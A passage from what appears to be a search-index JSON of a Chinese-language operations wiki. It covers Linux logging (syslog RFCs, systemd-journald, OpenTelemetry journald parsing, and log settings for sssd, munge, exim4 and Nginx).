BNF\uff0c\u4e00\u79cd\u8bed\u6cd5\u8868\u793a\u65b9\u6cd5\uff09\u5b9a\u4e49\uff0c\u51e0\u4e2a\u91cd\u8981\u7684\u90e8\u5206\u5982\u4e0b\uff0c\u5176\u4ed6\u8bf7\u53c2\u8003 RFC \u6587\u6863\u3002</p> <pre><code>SYSLOG-MSG      = HEADER SP STRUCTURED-DATA [SP MSG]\nHEADER          = PRI VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID\nMSG             = MSG-ANY / MSG-UTF8\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c<code>SYSLOG-MSG</code> \u5c55\u5f00\u540e\u4e3a <code>PRI VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID [STRUCTURED-DATA] [MSG]</code>\uff0c\u6574\u4f53\u4e0a\u4e0e RFC 3164 \u7684\u6d88\u606f\u683c\u5f0f\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u7ed3\u6784\u5316\u6570\u636e\u7684\u90e8\u5206\u3002</p> </li> <li> <p>\u652f\u6301\u622a\u65ad\u5206\u6bb5\u4f20\u8f93\u3002</p> </li> <li>RFC 5426 - Transmission of Syslog Messages over UDP \u4e3b\u8981\u662f\u8bf4\u4e86\u5206\u6bb5\u4f20\u8f93\u7684\u95ee\u9898\uff08\u6bd4\u5982 MTU\uff09\uff0c\u6ca1\u4ec0\u4e48\u597d\u770b\u7684\u3002</li> <li>RFC 5425 - Transport Layer Security (TLS) Transport Mapping for Syslog \u5b9a\u4e49\u4e86 syslog over TLS \u7684\u4f20\u8f93\u65b9\u5f0f\uff0c\u7aef\u53e3\u4e3a 6514\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#linux-\u65e5\u5fd7\u7cfb\u7edf","title":"Linux \u65e5\u5fd7\u7cfb\u7edf","text":"<p>Quote</p> <ul> <li>Understand logging in Linux - StackExchange\uff1a\u6982\u8ff0\u4e86\u4ece\u8fc7\u53bb\u7684 BSD \u98ce\u683c\u5230\u73b0\u5728\u7684 systemd \u65e5\u5fd7\u7cfb\u7edf\u3002</li> </ul> <p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u5185\u6838\u4e0e\u666e\u901a\u5e94\u7528\u7684\u65e5\u5fd7\u7cfb\u7edf\u662f\u5206\u5f00\u7684\u3002\u5185\u6838\u65e5\u5fd7\u7531 klogd \u5b88\u62a4\u8fdb\u7a0b\u6536\u96c6\uff0c\u666e\u901a\u5e94\u7528\u65e5\u5fd7\u7531 syslogd \u5b88\u62a4\u8fdb\u7a0b\u6536\u96c6\u3002\u5728\u73b0\u4ee3 Linux \u53d1\u884c\u7248\u4e2d\uff0cklogd \u548c syslogd \u90fd\u5df2\u7ecf\u88ab systemd-journald \u53d6\u4ee3\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u6781\u9650\u60c5\u51b5netconsole","title":"\u6781\u9650\u60c5\u51b5\uff1anetconsole","text":"<p>Quote</p> <ul> <li>kernel.org/doc/Documentation/networking/netconsole.txt</li> </ul> <p>\u5f53\u78c1\u76d8\u65e0\u6cd5\u5199\u5165\u65e5\u5fd7\u4e14\u65e0\u6cd5\u8fdb\u884c\u4e32\u53e3\u8c03\u8bd5\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 netconsole \u5185\u6838\u6a21\u5757\u5c06\u65e5\u5fd7\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u53e6\u4e00\u53f0\u673a\u5668\u3002\u7136\u800c\uff0c\u5b83\u7684\u4f7f\u7528\u9650\u5236\u4e5f\u4e0d\u5c11\uff0c\u6bd4\u5982\u4e0d\u4f1a\u7b49\u5f85\u7f51\u7edc\u63a5\u53e3 up\u3002\u5927\u591a\u6570\u4ea4\u6362\u673a\u542f\u7528\u751f\u6210\u6811\u529f\u80fd\uff0c\u7f51\u53e3 up \u65f6\u90fd\u4f1a\u6709\u4e00\u6bb5\u7b49\u5f85\u65f6\u95f4\uff0c\u4e14 DHCP \u54cd\u5e94\u4e5f\u6ca1\u6709\u90a3\u4e48\u5feb\uff0c\u5f88\u5bb9\u6613\u9519\u8fc7\u7cfb\u7edf\u542f\u52a8\u65f6\u5bc6\u96c6\u7684\u4fe1\u606f\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#bsd-\u98ce\u683cklogd-\u4e0e-syslog2","title":"BSD \u98ce\u683c\uff1aklogd \u4e0e syslog(2)","text":"<p>Quote</p> <ul> <li>The Linux Programming Interface: 37.5 Logging Messages and Errors Using syslog</li> </ul> <p>klogd \u662f\u5185\u6838\u65e5\u5fd7\u5b88\u62a4\u8fdb\u7a0b\uff0c\u6536\u96c6\u5185\u6838\u4f7f\u7528 <code>printk()</code> \u8f93\u51fa\u7684\u65e5\u5fd7\u6d88\u606f\u3002\u8fd9\u4e9b\u6d88\u606f\u53ef\u80fd\u901a\u8fc7 <code>/proc/kmsg</code> \u6587\u4ef6\u6216 syslog(2) \u7cfb\u7edf\u8c03\u7528\u6536\u96c6\u3002</p> <p>syslog \u7531\u4e24\u4e2a\u90e8\u5206\u7ec4\u6210\uff1asyslogd \u5b88\u62a4\u8fdb\u7a0b\u548c syslog(3) \u5e93\u51fd\u6570\u3002</p> <ul> <li>syslogd\uff1a\u63a5\u6536\u3001\u8fc7\u6ee4\u548c\u5904\u7406\u3001\u53d1\u9001\u65e5\u5fd7\u6d88\u606f\uff08BSD \u98ce\u683c\uff09<ul> <li>\u63a5\u6536\u65e5\u5fd7\u6d88\u606f\uff1a<code>/dev/log</code>\u3001UDP 514 \u7aef\u53e3</li> <li>\u65e5\u5fd7\u6d88\u606f\u7684\u5c5e\u6027\uff1a<ul> <li><code>facility</code>\uff1a\u6765\u6e90</li> <li><code>level</code>\uff1a\u4e25\u91cd\u7a0b\u5ea6</li> </ul> </li> <li>\u914d\u7f6e\u6587\u4ef6\uff1a<code>/etc/syslog.conf</code></li> </ul> </li> <li> <p>syslog(3) \u5e93\u51fd\u6570\uff1a\u6784\u9020\u6d88\u606f\u53d1\u9001\u5230 <code>/dev/log</code>\uff0c\u770b\u770b GNU \u7684\u4f8b\u5b50\uff1a</p> Syslog Example (The GNU C Library)<pre><code>#include &lt;syslog.h&gt;\n\nsetlogmask (LOG_UPTO (LOG_NOTICE));\n\nopenlog (\"exampleprog\", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);\n\nsyslog (LOG_NOTICE, \"Program started by User %d\", getuid ());\nsyslog (LOG_INFO, \"A tree falls in a forest\");\n\ncloselog ();\n</code></pre> </li> <li> <p>logger(1) \u547d\u4ee4\uff1a\u7528\u4e8e\u5411 syslog \u53d1\u9001\u6d88\u606f</p> <pre><code>logger -p user.notice \"Hello, world!\"\n</code></pre> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u5927\u4e00\u7edfsystemd-journal","title":"\u5927\u4e00\u7edf\uff1asystemd-journal","text":"<p>Quote</p> <ul> <li>systemd-journald.service(8) - FreeDesktop</li> <li>systemd.journal-fields - freedesktop.org\uff1a\u5b57\u6bb5\u5217\u8868\u3002</li> <li>Is systemd-journald a syslog implementation?\uff1a\u89e3\u91ca\u4e86 systemd-journald \u4e0e syslogd \u7684\u5173\u7cfb</li> <li>Why Syslogs from a program is watched from the journal command? - StackOverflow\uff1a\u5206\u6790\u4e86\u6d88\u606f\u7ecf\u8fc7 systemd-journald \u7684\u6d41\u7a0b</li> </ul> <p>\u73b0\u5728\u5927\u90e8\u5206\u53d1\u884c\u7248\u90fd\u5df2\u7ecf\u4f7f\u7528 systemd-journald \u4f5c\u4e3a\u65e5\u5fd7\u5b88\u62a4\u8fdb\u7a0b\uff0c\u5b83\u63a5\u7ba1\u4e86 syslogd \u7684\u5927\u90e8\u5206\u529f\u80fd\uff0c\u5e76\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u7279\u6027\u3002\u6bd4\u5982\uff1a</p> <ul> <li><code>sd_journal_send()</code>\uff1a\u5e93\u51fd\u6570</li> <li><code>/run/systemd/journal/socket</code>\uff1a\u57fa\u4e8e systemd native journal protocol \u7684\u5957\u63a5\u5b57\uff0c\u5b83\u901a\u8fc7\u94fe\u63a5\u53d6\u4ee3\u4e86 <code>/dev/log</code>\u3002</li> <li><code>StandardOutput/StandardError=journal</code>\uff1a\u9ed8\u8ba4\uff0c\u542f\u52a8\u670d\u52a1\u65f6\u5c06 stdout/stderr \u91cd\u5b9a\u5411\u5230 journal</li> <li>Native Journal Protocol - systemd\uff1ajournal \u7684\u539f\u751f\u534f\u8bae</li> <li><code>/etc/systemd/journald.conf</code>\uff1a\u914d\u7f6e\u6587\u4ef6</li> </ul> <p>\u5728\u642d\u8f7d systemd \u7684\u53d1\u884c\u7248\u4e0a\uff0csystemd-journald \u5c31\u662f\u65e5\u5fd7\u5b88\u62a4\u8fdb\u7a0b\u3002\u65e5\u5fd7\u6d88\u606f\u53ef\u4ee5\u4f7f\u7528 <code>journalctl</code> \u67e5\u770b\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u5185\u6838\u65e5\u5fd7\u3002\u65e5\u5fd7\u6d88\u606f\u7684\u6d41\u5411\u5982\u4e0b\uff1a</p> <pre><code>graph\n A[\"syslog()\"]\n B[\"/dev/log\"]\n C[\"/run/systemd/journal/dev-log\"]\n D[\"systemd-journald\"]\n E[\"/run/systemd/journal/syslog&lt;br/&gt;\u5982\u679c\u6709\u670d\u52a1\u76d1\u542c\u624d\u4f1a\u51fa\u73b0\"]\n F[\uff08\u4e00\u822c\u4e0d\u5b58\u5728\uff09&lt;br/&gt;rsyslogd \u7b49\u65e5\u5fd7\u5b88\u62a4\u8fdb\u7a0b]\n G[\"\u5185\u6838\u65e5\u5fd7\"]\n H[\"/dev/kmsg\"]\n\n G[\"printk()&lt;br/&gt;\u7cfb\u7edf\u8c03\u7528\"] --&gt;|\u5199\u5165| H\n H[\"/dev/kmsg&lt;br/&gt;\u5b57\u7b26\u8bbe\u5907\"] --&gt; D\n A[\"syslog()&lt;br/&gt;\u5e93\u51fd\u6570\"] --&gt;|\u5199\u5165| B\n B[\"/dev/log&lt;br&gt;\u7b26\u53f7\u94fe\u63a5\"] --&gt; C\n C[\"/run/systemd/journal/dev-log&lt;br&gt;\u5957\u63a5\u5b57\"] --&gt; D\n D --&gt;|Forward| E\n E --&gt; F\n n1[\"systemd \u670d\u52a1&lt;br/&gt;stdout/stderr\"]\n n1 ---|\u91cd\u5b9a\u5411| n2[\"/run/systemd/journal/stdout&lt;br/&gt;\u5957\u63a5\u5b57\"]\n n2 --- D\n n3[\"sd_journal_sendv()&lt;br&gt;systemd\u5e93\u51fd\u6570\"]\n n4[\"/run/systemd/journal/socket&lt;br/&gt;\u5957\u63a5\u5b57\"]\n n3 --- n4\n n4 --- D\n n5[\"system.journal&lt;br&gt;\u538b\u7f29\u7684\u65e5\u5fd7\u6587\u4ef6\"]\n D ---|Storage=volatile| n6[\"/run/log/journal/*\"]\n n6 --- n5\n D ---|Storage=persistent| n7[\"/var/log/journal/*\"]\n n7 --- n5\n n5 ---|log rotation| n8[\"system@*.journal\"]</code></pre> <p>systemd-journald \u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5c06\u65e5\u5fd7\u6301\u4e45\u5316\u5b58\u50a8\u5728 <code>/var/log/journal</code> \u76ee\u5f55\u4e0b\u3002\u4e00\u822c\u673a\u5668\u4e00\u4e2a\u6708\u53ef\u4ee5\u4ea7\u751f 2GB \u7684\u65e5\u5fd7\u3002\u5728\u65e0\u76d8\u7cfb\u7edf\u548c\u65e5\u5fd7\u96c6\u4e2d\u5316\u7684\u96c6\u7fa4\u4e2d\uff0c\u4e00\u822c\u9009\u62e9\u5c06\u65e5\u5fd7\u5b58\u50a8\u914d\u7f6e\u5230\u5185\u5b58\u4e2d\uff1a</p> /etc/systemd/journald.conf.d/diskless.conf<pre><code>[Journal]\nStorage=volatile\n</code></pre> <p>Warning</p> <p>systemd-journald \u7684\u5927\u4e00\u7edf\u4e5f\u610f\u5473\u7740\uff0c\u5982\u679c\u5b83\u6302\u6389\uff0c\u4f7f\u7528\u65e5\u5fd7\u7684\u7a0b\u5e8f\u90fd\u4f1a\u6536\u5230 <code>EPIPE</code> \u9519\u8bef\uff0c\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83\u3002</p> <p>journal \u7684\u5b57\u6bb5\u5206\u4e3a\u4e24\u7c7b\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a</p> <ul> <li> <p>\u7528\u6237\u5b57\u6bb5\uff08User Journal Field\uff09\uff1a\u4ece\u5ba2\u6237\u7aef\u53d1\u9001\u3002</p> <pre><code>MESSAGE UNIT SYSLOG_IDENTIFIER SYSLOG_PID SYSLOG_TIMESTAMP\n</code></pre> </li> <li> <p>\u53ef\u4fe1\u5b57\u6bb5\uff08Trusted Journal Field\uff09\uff1a\u4ee5 <code>_</code> \u5f00\u5934\uff0c\u7531 systemd \u751f\u6210\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u53d1\u9001\u3002</p> <pre><code>_MACHINE_ID _HOSTNAME _TRANSPORT _UID _GID _CAP_EFFECTIVE\n</code></pre> <p>\u5176\u4e2d\uff0c<code>_TRANSPORT</code> \u8868\u793a\u6d88\u606f\u662f\u901a\u8fc7\u4ec0\u4e48\u65b9\u5f0f\u53d1\u9001\u7684\uff1a</p> <pre><code>audit driver syslog journal stdout kernel\n</code></pre> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#opentelemetry-\u6536\u96c6-journal-\u65e5\u5fd7","title":"OpenTelemetry \u6536\u96c6 Journal \u65e5\u5fd7","text":"<p>OpenTelemetry \u63d0\u4f9b Journald Receiver\uff0c\u4ece\u6307\u5b9a\u4f4d\u7f6e\uff08<code>/run/log/journal</code>\uff09\u4ee5\u6587\u4ef6\u65b9\u5f0f\u91c7\u96c6 journal\u3002Journald Receiver \u4f9d\u8d56 stanza \u4e2d\u7684 <code>journald_input</code> Operator\u3002</p> <p>Journald Receiver \u5c06 <code>__REALTIME_TIMESTAMP</code> \u89e3\u6790\u4e3a\u65f6\u95f4\u6233\uff0c\u5176\u4ed6\u5b57\u6bb5\u89e3\u6790\u5230 <code>body</code>\u3002</p> Example <pre><code>{\n    \"MESSAGE\": \"uid 1000 is trying to obtain org.freedesktop.packagekit.system-sources-refresh auth (only_trusted:0)\",\n    \"PRIORITY\": \"6\",\n    \"SYSLOG_FACILITY\": \"4\",\n    \"SYSLOG_IDENTIFIER\": \"PackageKit\",\n    \"SYSLOG_TIMESTAMP\": \"Oct  4 11:22:56 \",\n    \"_BOOT_ID\": \"0907452f07224388b86d177c9bcba765\",\n    \"_CAP_EFFECTIVE\": \"1ffffffffff\",\n    \"_CMDLINE\": \"/usr/libexec/packagekitd\",\n    \"_COMM\": \"packagekitd\",\n    \"_EXE\": \"/usr/libexec/packagekitd\",\n    \"_GID\": \"0\",\n    \"_HOSTNAME\": \"bowling-pc\",\n    \"_MACHINE_ID\": \"39242ca0196f43d9a28b324ea19f63b0\",\n    \"_PID\": \"23670\",\n    \"_RUNTIME_SCOPE\": \"system\",\n    \"_SELINUX_CONTEXT\": \"unconfined\\n\",\n    \"_SOURCE_REALTIME_TIMESTAMP\": \"1728012176868714\",\n    \"_SYSTEMD_CGROUP\": \"/system.slice/packagekit.service\",\n    \"_SYSTEMD_INVOCATION_ID\": \"67439263558c436c94d6c87449f7fe9c\",\n    \"_SYSTEMD_SLICE\": \"system.slice\",\n    \"_SYSTEMD_UNIT\": \"packagekit.service\",\n    \"_TRANSPORT\": \"syslog\",\n    \"_UID\": \"0\",\n    \"__CURSOR\": \"s=05e12a7b0f87409384f87fd68c304adb;i=c29c;b=0907452f07224388b86d177c9bcba765;m=151a3935;t=6239e2ff84597;x=b0b45b19b90a570f\",\n    \"__MONOTONIC_TIMESTAMP\": \"354040117\",\n    \"__SEQNUM\": \"49820\",\n    \"__SEQNUM_ID\": \"05e12a7b0f87409384f87fd68c304adb\"\n}\n</code></pre> <p>\u8ddf\u8e2a Issue \u89e3\u51b3\u60c5\u51b5</p> <p> journald - Consider parsing more known fields from logs \u00b7 Issue #7298 \u00b7 open-telemetry/opentelemetry-collector-contrib \u4ece 2022 \u5e74\u521d\u5f00\u59cb\u8ffd\u8e2a\u8fd9\u4e2a\u95ee\u9898\uff0c\u73b0\u5728\u4ecd\u5728\u7b49\u5f85 Log \u7684\u8bed\u4e49\u7ea6\u5b9a\u8fdb\u4e00\u6b65\u660e\u786e\u3002</p> <p>\u8be5 Issue \u89e3\u51b3\u540e\uff0c\u5c31\u65e0\u9700\u81ea\u5b9a\u4e49 Operator \u4e86\u3002</p> <p>\u76ee\u524d\u6211\u4eec\u7528\u81ea\u5b9a\u4e49 Operator \u5c06 Body \u4e2d\u9664 <code>MESSAGE</code> \u5916\u7684\u5b57\u6bb5\u79fb\u52a8\u5230 Attributes\uff0c\u5e76\u8bc6\u522b\u5df2\u6709\u660e\u786e\u8bed\u4e49\u7684\u5b57\u6bb5\u3002\u5728\u89e3\u6790\u65f6\u9700\u8981\u6ce8\u610f\u5e76\u4e0d\u662f\u6240\u6709\u5b57\u6bb5\u90fd\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u5b58\u5728\u3002kernel \u65e5\u5fd7\u5c31\u6ca1\u6709 <code>SYSTEMD_UNIT</code>\u3001<code>_CMDLINE</code> \u7b49\u5b57\u6bb5\u3002</p> Example <pre><code>{\n    \"_TRANSPORT\": \"kernel\",\n    \"_HOSTNAME\": \"bowling-pc\",\n    \"MESSAGE\": \"usbcore: registered new device driver apple-mfi-fastcharge\",\n    \"SYSLOG_IDENTIFIER\": \"kernel\",\n    \"_MACHINE_ID\": \"39242ca0196f43d9a28b324ea19f63b0\",\n    \"__REALTIME_TIMESTAMP\": \"1728053826689649\",\n    \"_BOOT_ID\": \"0bc0ee799eb84fc3b44aab1fca1eb25d\",\n    \"__CURSOR\": \"s=57e0884c55414fdaa457d6c3a187f3e0;i=2198;b=0bc0ee799eb84fc3b44aab1fca1eb25d;m=3b05b3;t=623a7e27e1a71;x=5b4af5d3f49495e2\",\n    \"_SOURCE_MONOTONIC_TIMESTAMP\": \"3867428\",\n    \"__SEQNUM\": \"8600\",\n    \"PRIORITY\": \"6\",\n    \"_RUNTIME_SCOPE\": \"system\",\n    \"__SEQNUM_ID\": \"57e0884c55414fdaa457d6c3a187f3e0\",\n    \"__MONOTONIC_TIMESTAMP\": \"3868083\",\n    \"SYSLOG_FACILITY\": \"0\"\n    }\n</code></pre> Operator \u914d\u7f6e <pre><code>operators:\n- type: move\nfrom: body\nto: attributes.journal\n- type: move\nfrom: attributes.journal.MESSAGE\nto: body\n- type: move\nfrom: attributes.journal.SYSLOG_IDENTIFIER\nto: resource.service.name\nif: 'type(attributes.journal.SYSLOG_IDENTIFIER) != \"nil\"'\n- type: move\nfrom: attributes.journal._PID\nto: resource.process.pid\nif: 'type(attributes.journal._PID) != \"nil\"'\n- type: move\nfrom: attributes.journal._COMM\nto: resource.process.executable.name\nif: 'type(attributes.journal._COMM) != \"nil\"'\n- type: move\nfrom: attributes.journal._EXE\nto: resource.process.executable.path\nif: 'type(attributes.journal._EXE) != \"nil\"'\n- type: move\nfrom: attributes.journal._CMDLINE\nto: resource.process.command_line\nif: 'type(attributes.journal._CMDLINE) != \"nil\"'\n- type: move\nfrom: attributes.journal._UID\nto: resource.process.owner\nif: 'type(attributes.journal._UID) != \"nil\"'\n# \u4e0b\u9762\u7684\u5b57\u6bb5\u6240\u6709\u60c5\u51b5\u90fd\u6709\n- type: move\nfrom: attributes.journal._HOSTNAME\nto: resource.host.name\n- type: severity_parser\nparse_from: attributes.journal.PRIORITY\npreset: none\nmapping:\n# OTel severity number: systemd priority # syslog severity\n    fatal: 0 # emerg\n    error3: 1 # alert\n    error2: 2 # crit\n    error: 3\n    warn: 4\n    info2: 5 # notice\n    info: 6\n    debug: 7\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u5e94\u7528\u65e5\u5fd7\u9002\u914d","title":"\u5e94\u7528\u65e5\u5fd7\u9002\u914d","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#sssd","title":"sssd","text":"<p>sssd \u662f\u5178\u578b\u7684\u628a\u65e5\u5fd7\u653e\u5728 <code>/var/log</code> \u76ee\u5f55\u4e0b\u7684\u670d\u52a1\uff0c\u800c\u4e14\u4e0d\u4f1a\u81ea\u5df1\u521b\u6587\u4ef6\u5939\u3002\u65e0\u76d8\u7cfb\u7edf\u4e0b\u6302\u8f7d <code>/var/log</code> \u5230 tmpfs \u540e\uff0csssd \u6bcf\u6b21\u542f\u52a8\u90fd\u4f1a\u62a5\u9519\uff0c\u800c\u4e14\u8fd8\u662f\u5e7f\u64ad\uff0c\u975e\u5e38\u70e6\u4eba\uff1a</p> <pre><code>Broadcast message from systemd-journald@ZJUSCT-HPC101-LOGIN (Fri 2024-08-09 22:32:29 CST):\nsssd[18443]: Could not open file [/var/log/sssd/sssd.log]. Error: [2][No such file or directory]\nBroadcast message from systemd-journald@ZJUSCT-HPC101-LOGIN (Fri 2024-08-09 22:32:29 CST):\nsssd_nss[18452]: Could not open file [/var/log/sssd/sssd_nss.log]. Error: [2][No such file or directory]\nBroadcast message from systemd-journald@ZJUSCT-HPC101-LOGIN (Fri 2024-08-09 22:32:29 CST):\nsssd_pam[18460]: Could not open file [/var/log/sssd/sssd_pam.log]. Error: [2][No such file or directory]\n</code></pre> <p>\u6839\u636e  Hardcoded DEBUG_LOGGER=--logger=files is sssd service scripts #7078 \u7684\u89e3\u91ca\uff0c\u91cd\u8981\u7684\u65e5\u5fd7\u59cb\u7ec8\u662f\u901a\u8fc7 <code>sd_journal_send()</code> \u6216 <code>vsyslog()</code> \u53d1\u9001\u7684\uff0c\u5b58\u50a8\u5230\u6587\u4ef6\u4e2d\u7684\u662f\u666e\u901a\u4fe1\u606f\uff0c\u8fd9\u662f\u4e3a\u4e86\u51cf\u8f7b\u5bf9 journal \u7684\u538b\u529b\uff08\u5728\u5927\u96c6\u7fa4\u4e2d\u6bd4\u8f83\u91cd\u8981\uff09\u3002</p> <p>\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\u662f\u4fee\u6539\u51fa\u73b0\u95ee\u9898\u7684\u4e09\u4e2a\u670d\u52a1\uff0c\u6dfb\u52a0\u4e0b\u9762\u914d\u7f6e\uff1a</p> <pre><code>systemctl edit sssd\nsystemctl edit sssd_nss\nsystemctl edit sssd_pam\n</code></pre> <pre><code>[Service]\nEnvironment=DEBUG_LOGGER=--logger=journald\n</code></pre> <p>\u8fd9\u6837\u8c03\u8bd5\u4fe1\u606f\u4e5f\u4f1a\u53d1\u9001\u5230 journal\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u672c\u5730\u65e5\u5fd7\u6587\u4ef6\u4e0d\u5b58\u5728\u800c\u62a5\u9519\uff0c\u5229\u4e8e\u7edf\u4e00\u6536\u96c6\u65e5\u5fd7\u4fe1\u606f\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#munge","title":"munge","text":"<p>munge \u4e5f\u662f\u8fd9\u6837\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5c06\u81ea\u5df1\u7684\u65e5\u5fd7\u5199\u5165 <code>/var/log/munge/munged.log</code>\uff0c\u5e76\u4e14\u5bf9\u6587\u4ef6\u6743\u9650\u6781\u5176\u654f\u611f\u3002 Make munge log to syslog \u00b7 Issue #943 \u00b7 openhpc/ohpc \u89e3\u51b3\u4e86\u8fd9\u4e00\u95ee\u9898\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5f88\u591a HPC \u96c6\u7fa4\u90fd\u9009\u62e9\u5c06\u65e5\u5fd7\u53d1\u9001\u5230\u7edf\u4e00\u7684\u670d\u52a1\u5668\uff1a</p> <p>By default munge writes logs by itself to /var/long/munge/munged.log. This prevents those logs from being forwarded to the log server (e.g. the OpenHPC SMS/admin machine), and in case those logs for one reason or another grows rapidly (e.g. dun/munge#26 ) it can be a problem for diskless nodes (or compute nodes with small partitions where /var/log reside).</p> <p>\u4fee\u6539 munge \u914d\u7f6e\u6587\u4ef6\u6dfb\u52a0\u542f\u52a8\u53c2\u6570 <code>--syslog</code> \u5373\u53ef\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#exim4","title":"exim4","text":"<p>exim4 \u662f\u4e00\u4e2a\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u5b83\u7684\u65e5\u5fd7\u9ed8\u8ba4\u5199\u5165 <code>/var/log/exim4/mainlog</code>\uff0c\u65e0\u6cd5\u5199\u5165\u65e5\u5fd7\u5c06\u5bfc\u81f4\u670d\u52a1\u5931\u8d25\u3002\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 <code>/etc/exim4/exim4.conf</code> \u6587\u4ef6\u4e2d\u7684 <code>log_file_path</code> \u53c2\u6570\u6765\u66f4\u6539\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\u3002</p> <pre><code>log_file_path = syslog\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#nginx","title":"Nginx","text":"<p>Quote</p> <ul> <li>nginx access_log \u65e5\u5fd7 - \u6653\u7684\u6280\u672f\u535a\u5ba2</li> <li>Configuring Logging - NGINX Documentation</li> <li>Module ngx_http_log_module</li> </ul> <p>Nginx \u65e5\u5fd7\u5206\u4e3a\u8bbf\u95ee\u65e5\u5fd7\u548c\u9519\u8bef\u65e5\u5fd7\u3002</p> <p>\u8bbf\u95ee\u65e5\u5fd7\u53ef\u901a\u8fc7 <code>log_format</code> \u547d\u4ee4\u81ea\u5b9a\u4e49\u683c\u5f0f\uff0c\u6211\u4eec\u5c06\u5176\u5b9a\u4e49\u4e3a\u4e0b\u9762\u7684 JSON \u683c\u5f0f\uff0c\u4ee5\u4fbf OpenTelemetry Collector \u89e3\u6790\u3002</p> Nginx \u8bbf\u95ee\u65e5\u5fd7\u914d\u7f6e /etc/nginx/nginx.conf<pre><code># http://nginx.org/en/docs/varindex.html\nlog_format otel_json escape=json '{'\n# https://opentelemetry.io/docs/specs/semconv/attributes-registry/http/\n'\"http\": {'\n    '\"request\": {'\n    '\"header\": {'\n        '\"x-forwarded-for\": \"$http_x_forwarded_for\", '\n        '\"user-agent\": \"$http_user_agent\", '\n        '\"host\": \"$http_host\", '\n        '\"referer\": \"$http_referer\", '\n        '\"content-length\": \"$content_length\", '\n        '\"content-type\": \"$content_type\"'\n    '}, '\n    '\"method\": \"$request_method\", '\n    '\"size\": \"$request_length\"'\n    '}, '\n    '\"response\": {'\n    '\"body\": {'\n        '\"size\": \"$bytes_sent\"'\n    '}, '\n    '\"status_code\": \"$status\"'\n    '}'\n'}, '\n# https://opentelemetry.io/docs/specs/semconv/attributes-registry/url/\n'\"url\": {'\n    '\"domain\": \"$host\", '\n    #'\"original\": \"$scheme://$host$request_uri\", '\n    '\"scheme\": \"$scheme\", '\n    '\"path\": \"$uri\", '\n    '\"query\": \"$args\"'\n'}, '\n# https://opentelemetry.io/docs/specs/semconv/attributes-registry/client/\n'\"client\": {'\n    '\"address\": \"$remote_addr\", '\n    '\"port\": \"$remote_port\"'\n'}, '\n# https://opentelemetry.io/docs/specs/semconv/attributes-registry/server/\n'\"server\": {'\n    '\"address\": \"$server_addr\", '\n    '\"port\": \"$server_port\"'\n'}, '\n# https://opentelemetry.io/docs/specs/semconv/attributes-registry/process/\n'\"resource\": {'\n    '\"process\": {'\n    '\"pid\": \"$pid\"'\n    '}'\n'}, '\n# other attributes\n'\"timestamp\": \"$msec\", '\n'\"body\": \"$request\", '\n'\"nginx\": {'\n    '\"connection_requests\": \"$connection_requests\", '\n    '\"request_id\": \"$request_id\", '\n    '\"request_time\": \"$request_time\", '\n    '\"upstream\": \"$upstream_addr\", '\n    '\"upstream_connect_time\": \"$upstream_connect_time\", '\n    '\"upstream_header_time\": \"$upstream_header_time\", '\n    '\"upstream_response_time\": \"$upstream_response_time\", '\n    '\"upstream_response_length\": \"$upstream_response_length\", '\n    '\"upstream_cache_status\": \"$upstream_cache_status\", '\n    '\"ssl_protocol\": \"$ssl_protocol\", '\n    '\"ssl_cipher\": \"$ssl_cipher\", '\n    #'\"server_protocol\": \"$server_protocol\", '\n    '\"pipe\": \"$pipe\", '\n    '\"bad_req\": \"$bad_req\", '\n    '\"bad_ip\": \"$badip_ip\", '\n    #'\"geoip_country_code\": \"$geoip_country_code\"'\n'}'\n'}';\n</code></pre> <p>\u9519\u8bef\u65e5\u5fd7\u683c\u5f0f\u5e76\u4e0d\u6e05\u6670\uff0clogging - NGINX error log format documentation - Stack Overflow \u4f5c\u4e86\u4e00\u4e9b\u89e3\u91ca\u3002\u6211\u4eec\u4f7f\u7528\u4e0b\u9762\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u89e3\u6790\u9519\u8bef\u65e5\u5fd7\uff1a</p> Nginx \u9519\u8bef\u65e5\u5fd7\u89e3\u6790 otelcol.yaml<pre><code>operators:\n    - type: regex_parser\n    regex: '(?P&lt;timestamp&gt;\\d{4}/\\d{2}/\\d{2} \\d{2}:\\d{2}:\\d{2}) \\[(?P&lt;severity&gt;\\w+)\\] (?P&lt;pid&gt;\\d+)#(?P&lt;tid&gt;\\d+): (?:\\*(?P&lt;cid&gt;\\d+) )?(?P&lt;message&gt;[^,]+)(?:, (?P&lt;kv&gt;.+))?'\n    timestamp:\n        layout: \"%Y/%m/%d %H:%M:%S\"\n        parse_from: attributes[\"timestamp\"]\n    severity:\n        